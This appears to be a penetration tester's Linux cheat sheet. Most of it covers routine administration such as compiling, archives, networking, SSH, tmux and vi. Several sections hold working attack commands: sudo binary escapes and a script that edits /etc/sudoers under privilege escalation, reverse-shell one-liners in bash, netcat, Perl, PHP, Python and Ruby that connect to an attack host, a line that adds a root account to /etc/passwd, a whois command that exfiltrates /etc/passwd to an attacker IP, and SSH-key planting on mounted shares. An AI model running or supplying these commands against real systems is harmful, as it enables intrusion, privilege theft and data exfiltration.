Linux
 
 
# Compile

gcc test.c -o test                              Compile test
gcc -m32 test.c -o test                         Compile 32-bit code on a 64-bit box
chmod 755 test                                  Make the file executable
./test                                          Run the file
------------------------------------------------------------------------------------------------------------------------------------------------------

# Compression

tar xvfj test.tar.bz2                           Extract
tar zxvf test.tar.gz
tar zxvf test.tar
gzip -d test.gz
unzip test.zip
zcat rockyou.txt.gz > rockyou.txt

tar -zcvf test.tar test                         Compress
gzip test
zip -9 test.zip test
zip -r test.zip test/
------------------------------------------------------------------------------------------------------------------------------------------------------ 

# Copy Files (remotely)
 
scp /path/to/local/file.txt user@<target IP>:/path/to/share     Local to remote
scp -r user@<target IP>:/path/to/share /local/share             Remote to local

# Append File (remotely)

cat ~/.ssh/id_rsa.pub | ssh user@<target IP> 'cat >> .ssh/authorized_keys'
------------------------------------------------------------------------------------------------------------------------------------------------------

# Date & Time

timedatectl set-timezone EST                    Set the timezone to Eastern Standard Time
------------------------------------------------------------------------------------------------------------------------------------------------------

# Download Files

wget -O <local file name> <server>              Download files using the http or ftp protocol
curl -o <local file name> <server>              Transfer data to or from a server using a host of protocols, very versatile
axel -a -n 20 -o <local file name> <server>     Download accelerator from an http or ftp server through multiple connections
------------------------------------------------------------------------------------------------------------------------------------------------------

# File Permissions
 
t rwx rwx rwx	 type / owner / group / world
Type is directory (d) or file (-).

read     (r)  4
write    (w)  2
execute  (e)  1
 
chmod 755 test.sh                               Make a file executable
------------------------------------------------------------------------------------------------------------------------------------------------------

# File System

/etc/passwd                                     User accounts
/etc/shadow                                     Encrypted passwords
------------------------------------------------------------------------------------------------------------------------------------------------------
 
# Files & Directories
 
ls                                              List files in a directory
ls -l                                           Long form listing
ls -la                                          Long form listing with hidden files

cd ~                                            Change to the home directory
cd test                                         Change to the test directory
pwd                                             Print the current working directory

touch tmp                                       Create a file
mkdir tmp                                       Create a directory
mkdir -p tmp/{red,white,blue}                   Create a directory with 3 subdirectories

cat tmp                                         Show the contents of a file
more tmp                                        Show the contents of a file, a page at a time
                                                Space bar for the next page or 'q' to quit

ping targat.com > tmp                           Redirect output to a new file
ping target2.com >> tmp                         Appending output to an existing file
wc -m < tmp                                     Redirect STDIN from a file

cp tmp tmp2                                     Copy a file from one location to another
cp -r dir dir2                                  Copy a directory from one location to another
mv tmp tmp2                                     Rename or move tmp to tmp2
rm tmp                                          Delete a file
rm -rf test                                     Force delete the directory

ln -s /path/to/file /path/to/link               Create a symbolic link
------------------------------------------------------------------------------------------------------------------------------------------------------

# File Integrity

md5sum test.iso                                 MD5 hash
sha1sum test.iso                                SHA1 hash
sha256sum test.iso                              SHA256 hash
------------------------------------------------------------------------------------------------------------------------------------------------------

# Finding Files

updatedb                                        Update the database of file names on the system
locate file                                     Reads a database (locate.db) and shows the location of a file
updatedb                                        Updates the locate database
which app                                       Path where the app is executed from

find / -name pass*                              Find all the files that start with pass
find / -name *pass                              Find all the files that end with pass

find / -user <user> 2>/dev/null                 All files owned by a particular user
find / -group <group> 2>/dev/null               All files owned by a particular group
------------------------------------------------------------------------------------------------------------------------------------------------------

# Installation
 
./configure                                     Install from source
make
make install

dpkg -i app.deb                                 Install Debian package
rpm -vhU app.rpm                                Install RPM package

dpkg-query -l                                   Installed packages

pip install -r requirements.txt                 Install required Python 2 packages listed in a file
pip3 install -r requirements.txt                Install required Python 3 packages listed in a file
--proxy user:passwd@proxy.server:port           Append to previous pip commands when using a proxy
------------------------------------------------------------------------------------------------------------------------------------------------------

# Networking

dhclient                                        Request an IP address from the DHCP server
netstat -antpu                                  Listening ports, services and PIDs
route                                           Gateway
/etc/hostname                                   Hostname
/etc/network/interfaces                         Network interfaces
/var/lib/dhcp/dhclient.leases                   DHCP

/etc/resolv.conf                                DNS
domain localdomain 
search localdomain 
nameserver 8.8.8.8

ifconfig                                        IP addresses to all network interfaces
ifconfig eth0 down                              Bring interface down
ifconfig eth0 up                                Bring interface up
ifconfig eth0 <IP> netmask <IP>                 Set IP and netmask
route add default gw <IP>                       Set gateway

ip addr                                         IP addresses to all network interfaces
ip addr flush <interface>
ip link set <interface> down                    Bring interface down
ip link set <interface> up                      Bring interface up
ip route                                        Show table routes

/etc/network/interfaces                         Set a static IP address
iface eth0 inet static
address 192.168.1.5
netmask 255.255.255.224
broadcast 192.168.1.31
network 192.168.1.0
gateway 192.168.1.2

/etc/init.d/networking restart                  Restart networking
------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

- Enumeration scripts
enum4linux -a <target IP>                       wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
linenum.sh                                      wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
linuxprivchecker.py                             wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
lynis audit system                              wget https://downloads.cisofy.com/lynis/lynis-2.7.5.tar.gz

- sudoers
sudo -l                                         Check for users with root permissions and binaries that can be ran with root privs
sudo su or sudo bash                            If the current user is listed in the file, elevate privs to root

- Abusing binaries
sudo apache2 -f /etc/shadow                     A way to view a system file
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo apt-get changelog apt                      !/bin/sh then hit enter
sudo awk 'BEGIN {system("/bin/bash")}'
sudo ed                                         !/bin/sh then hit enter
sudo env /bin/bash
sudo find /home -exec /bin/bash \;
sudo git help add                               !/bin/sh then hit enter
touch tmp
find tmp -exec whoami \;                        Find a file then execute a command
find tmp -exec netcat -lvp 443 -e /bin/sh \;

sudo ftp
! /bin/bash

sudo less /etc/passwd                           !/bin/sh then hit enter
sudo man man                                    !/bin/sh then hit enter
sudo more /etc/passwd                           !/bin/sh then hit enter
echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
sudo perl -e 'exec "/bin/bash";'
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo scp /etc/passwd lee@10.0.0.5:~/

socate file:`tty`,raw,echo=0 tcp-listen:443     Attack VM
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443

sudo vi                                         :!bash
sudo vi                                         !/bin/sh then hit enter
sudo vi                                         :set shell=/bin/bash:shell
sudo vi                                         :shell

- Abusing the PATH variable
After escaping a restricted shell, export “/bin/bash” as a SHELL environment variable
and “/usr/bin” as a PATH environment variable so that we can run Linux commands properly.
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash:$SHELL

- Add a user to the sudoers file
#!/usr/bin/env python
import os
import sys
try:
    os.system('echo "lee ALL= (root) NOPASSWD: /usr/bin/apach2, /usr/bin/awk, /usr/bin/find" >> /etc/sudoers')
except:
    sys.exit()

- Check for binaries with the SUID, SGID and sticky bit set
find / -perm -4000 2>/dev/null                  SUID - run the file with permissions of its owner
find / -user root -perm -6000 -print 2>/dev/null     SGID - run the file with permissions of the owner's group
find / -perm -1000 2>/dev/null                  sticky - only the owner of a directory or a file can delete or rename

- Check for world-writable files and folders
find / -perm -o+w -type f 2>/dev/null        World-writeable files
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print    World-writeable files

find / -writable -type d 2>/dev/null            World-writeable folders
find / -perm -222 -type d 2>/dev/null           World-writeable folders
find / -perm -o+w -type d 2>/dev/null           World-writeable folders

- Check for world-execuable files and folders
find / -perm -o+x -type f 2>/dev/null           World-executable files
find / -perm -o+x -type d 2>/dev/null           World-executable folders

- Check for world-writeable & world-executable folders
find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null

- Check for files owned by no owner
find /dir -xdev \( -nouser -o -nogroup \) -print

- Cron jobs
crontab -l                                      Check for entries
ls -l /etc/cron*                                Scheduled cron jobs

What files are owned by a particular user, but are not present in their home directory?
What are the files present in the /home/user folder? Are there any hidden files and folders?
What groups does the user belong to?
------------------------------------------------------------------------------------------------------------------------------------------------------

# Processes

ps faux                                         Show all running processes
ps -ef | grep root                              Processes running as root
ps -ef | grep -v root                           Processes running under another account besides root
top                                             Running processes, CPU and memory
kill -9 <PID>                                   Kill process ID
killall <service>                               Kill all processes named service
------------------------------------------------------------------------------------------------------------------------------------------------------

# Proxy

git config --global http.proxy http://proxy:port

Add to bottom of /root/.bashrc
export http_proxy=http://username:password@proxy:port
export https_proxy=https://username:password@proxy:port
------------------------------------------------------------------------------------------------------------------------------------------------------

# Redirecting

Suggest running socat within a screen session.
socat TCP4-LISTEN:443,fork TCP4:<remoteIP>:443

If you experience any slow traffic issues, switch to iptables.
iptables -L
iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <remoteIP>:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remote Desktop

rdesktop -u <username> -p <password> -g 1024x768 -x 192.168.0.10
rdesktop -u <username> -p <password> -g 85% 192.168.0.10
------------------------------------------------------------------------------------------------------------------------------------------------------

# Reverse shells

- Setup a local listener
nc -lvp 443			                       Setup a listen on the attack box

- Bash shell
bash -i >& /dev/tcp/10.0.0.10/443 0>&1

- Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

- Netcat Linux
nc -e /bin/sh 10.0.0.10 443

- Netcat Windows
nc -e cmd.exe 10.0.0.10 443

- Netcat without -e flag
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.10 443 > /tmp/f

- Perl
perl -e 'use Socket;$i="10.0.0.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

- PHP
<?php exec('nc 10.0.0.10 443 -e /bin/bash') ?>

- Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

- Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

- xterm
xterm -display 10.0.0.10:1                      target - it will connect back to you on TCP port 6001
Xnest :1                                        attacker - catch the incoming xterm, start an X-Server
xhost +<target IP>                              attacker - authorize the target to connect to you
------------------------------------------------------------------------------------------------------------------------------------------------------

# Screen

screen -S test                                  Start a new screen session named test
ctrl + a d                                      Detach from the session
screen -ls                                      Sessions
screen -dr                                      Attach to the current session
screen -r <PID or name>                         Attach to a specific session
screen -X -S <PID or name> quit                 Kill a specific session
exit                                            Exit the session

<ctrl> a esc                                    Use the up and down arrows or mouse to scroll
esc                                             Exit scrollback mode
------------------------------------------------------------------------------------------------------------------------------------------------------

# SSH

ssh-keygen                                      Generate new public/private key pair

- Permissions
-rw-------  amazon.pem
-rw-------  authorized_keys
-rw-r--r--  config
-rw-------  id_rsa
-rw-r--r--  id_rsa.pub
-rw-------  identity_file
-rw-r--r--  known_hosts

ssh root@<target IP>                            Connect as root on a standard port
ssh <target IP>                                 Connect with no user name on a standard port
ssh root@<target IP> -p 2222                    Connect as root on a non-standard port
ssh root@<target IP> -i key                     Connect as root and authenticate using an identity file

- Local port forward
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
ssh user@<target IP> -L 5900:localhost:5900

- Remote port forwarding
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
ssh user@<target IP> -R 2222:localhost:22 -f -N
                                                -f   Force to background
                                                -N   Do not execute a remote command

- Dynamic port forward
ssh -D <local proxy port> -p <remote port> <target>
ssh -D <local proxy port> <target IP>
ssh user@<target IP> -C -D 1080                 -C   Enable compression, good for web browsing
                                                -D   Create a SOCKS tunnel on the default port

Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
Remove everything for HTTP, SSL and FTP proxies and ports
SOCKS Host: 127.0.0.1   Port: 1080
Select SOCKS v5 and Remote DNS

- X11
/etc/ssh/ssh_config                             Config file
ForwardX11 yes                                  Uncomment and change to yes
ForwardX11Trusted yes                           Uncomment

service ssh restart
export DISPLAY=localhost:0.0
exit
ssh user@<target IP> -Y                         Connect and use X11 forwarding
------------------------------------------------------------------------------------------------------------------------------------------------------

# Startup Services

update-rc.d -f <service> <add/remove>

update-rc.d networking defaults
/etc/init.d/networking restart
------------------------------------------------------------------------------------------------------------------------------------------------------

# System

cal                                             Calendar
date                                            Date and time
df -h                                           Disk usage
du                                              Directory space usage
env                                             Environmental variables
/etc/issue                                      OS info
fdisk -l                                        Partition table
finger <user>                                   Info about a user
free                                            Memory and swap usage
halt                                            Power off
/proc/cpuinfo                                   CPU info
/proc/meminfo                                   Memory info
reboot                                          Reboot
set                                             Environmental variables
uname -a                                        Kernel info
uptime                                          Current uptime
------------------------------------------------------------------------------------------------------------------------------------------------------

# Terminal

ctrl + alt + t                                  Open a Terminal
ctrl + shift + t                                Open a new tab in Terminal
ctrl + a                                        Go to the beginning of the line
ctrl + l                                        Clear the screen
------------------------------------------------------------------------------------------------------------------------------------------------------

# tmux

After you ssh into a box, use tmux. If your connection drops, you can ssh back in, connect to your
previous tmux session and pick up where you left off. Great when running long scans or anything that
you don't want to start over.

tmux ls                                         List sessions
tmux new -s <name>                              Start a new session
ctrl +b c                                       Create a new window
ctrl +b 0                                       Go back to the first window

tmux attach -t <name>                           Attach to a previous session
ctrl +b d                                       Detach from the current session

ctrl +b %                                       Split the pane vertically
ctrl +b "                                       Split the pane horizontally
ctrl +b arrow                                   Switch between panes
ctrl +b z                                       Makes the current pane full screen
ctrl +b z (again)                               Zoom out

ctrl +b (hold ctrl)                             Use the arrows to resize the pane

ctrl +d                                         Close the pane
------------------------------------------------------------------------------------------------------------------------------------------------------

# Traffic Capture

tcpdump -lnni eth0 tcp
tcpdump -lnni eth0 port 22
tcpdump -lnni eth0 src 10.0.0.10
tcpdump -lnni eth0 dst 10.0.0.10
tcpdump -lnni eth0 'udp port 53'
tcpdump -lnni eth0 'tcp port 443'
tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
tcpdump -w out.pcap -s 65535  'udp port 53'
------------------------------------------------------------------------------------------------------------------------------------------------------

# Tunneling VNC over SSH

OS X (awsv)                                     ssh -L 5901:localhost:5901 -i ~/.ssh/aws.pem ec2-user@<atter IP>

Remote Kali                                     sudo -i
                                                vncserver -geometry 2560x1600

OS X                                            Applications > VNC Viewer: localhost:5901
                                                Enter a password twice, then No

Remote Kali                                     vncserver -kill :1
------------------------------------------------------------------------------------------------------------------------------------------------------

# Upgrade to a full TTY session

awk                                             awk 'BEGIN {system("/bin/bash")}'
find                                            find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
Lua                                             os.execute('/bin/sh')
nmap                                            !sh
nmap                                            --interactive
Perl                                            perl —e 'exec "/bin/bash";'
Perl                                            exec "/bin/sh";
Python                                          python -c 'import pty; pty.spawn("/bin/bash")'
Ruby                                            exec "/bin/sh"
sh                                              echo os.system('/bin/bash')
sh                                              /bin/sh
Within IRB                                      exec "/bin/sh"
Within vi                                       :!bash
Within vi                                       :set shell=/bin/bash:shell
------------------------------------------------------------------------------------------------------------------------------------------------------

# User Accounts

whoami                                          Who are you logged in as
id                                              User and group ids
w                                               Users currently logged on
last                                            Last 10 users logged on

/etc/passwd                                     User accounts
/etc/shadow                                     Encrypted passwords

passwd                                          Change root password
passwd <user>                                   Change another user's password

su                                              Substitute user

useradd                                         Add new user
userdel                                         Delete user
userdel -r                                      Delete user and user's home directory
usermod                                         Modify user

/etc/group                                      Groups
groupadd                                        Add new group
groupdel                                        Delete group
groupmod                                        Modify group

adduser <user> <group>                          Add user to group

- Create a password hash for a new user lee with a password of pass123.
openssl passwd -1 –salt lee pass123
Use echo and taskset (part of sudoers) to add the new user with root privileges to /etc/passwd
taskset 1 echo 'lee:$1$mark$PL9HIgTDwnE9sG27q2Nrb/:0:0:root/:root:/bin/bash' >>/etc/passwd
sudo lee
id
------------------------------------------------------------------------------------------------------------------------------------------------------

# Video resolution
 
xrandr                                          Supported resolutions
xrandr -s <resolution>                          Set resolution
------------------------------------------------------------------------------------------------------------------------------------------------------

# vi

vi oldfile                                      Open an existing file
vi newfile                                      Create a new file

Modes                                           Command, Insert, Append and Replace

- Command mode
:set number                                     Turn on line numbers
:set nonumber                                   Turn off line numbers
dd                                              Delete the current line
yy                                              Copy the current line
p                                               Paste the clipboard contents
<esc> u                                         Undo

gg                                              Top of file
G                                               End of file

Search
/                                               Search string
n                                               Next string
N                                               Previous string

Search and replace
:%s/foo/bar/g                                   Search for foo and replace with bar globally

- Insert mode
Position the cursor where the new text should go.
i
Enter new text.
<esc> to return to command mode.

- Append mode
Position the cursor on the last letter of the line.
a
Enter new text. This adds text AFTER the cursor. 
<esc> to return to command mode.

- Replace mode
Move the cursor to the character to be replaced.
r
Enter the replacement character.
<esc> to return to command mode.

<esc>                                           Quit
:q
<return>

<esc>                                           Force quit
:q!
<return>

<esc                                            Write changes
:w
<return>

<esc>                                           Write changes and quit
:wq
<return>
------------------------------------------------------------------------------------------------------------------------------------------------------

# whois Data Exfil

nc -lvp 43 | sed "s/ //g" | base64 -d                       Attacker
whois -h <attacker IP> -p 43 `cat /etc/passwd | base64`     Target

- additional method
rlogin -l "$(cat /etc/passwd)" -p port <target IP>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Anonymous Mountable CIFS

mkdir /mnt/cifs/
mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/cifs

OS X: mount -t cifs //<target IP>:Users/<user> /mnt/cifs/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp

cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
------------------------------------------------------------------------------------------------------------------------------------------------------

# Anonymous Mountable NFS

showmount -e <target IP>

apt-get install nfs-common
mkdir /mnt/temp/
mount -t nfs -o nolock <target IP>:/<share> /mnt/temp/
------------------------------------------------------------------------------------------------------------------------------------------------------

# Anonymous Mountable SMB

smbclient -L //<target IP>
smbclient //<target IP>/<share>
smb: \> ls
smb: \> cd <directory>
smb: \> cd "<long directory>"
smb: \> get <file>

mkdir /mnt/temp/
mount -t cifs //<target IP>/<share> /mnt/temp/ -o user=anonymous
------------------------------------------------------------------------------------------------------------------------------------------------------

# Rstatd enabled

rsysinfo <target IP>

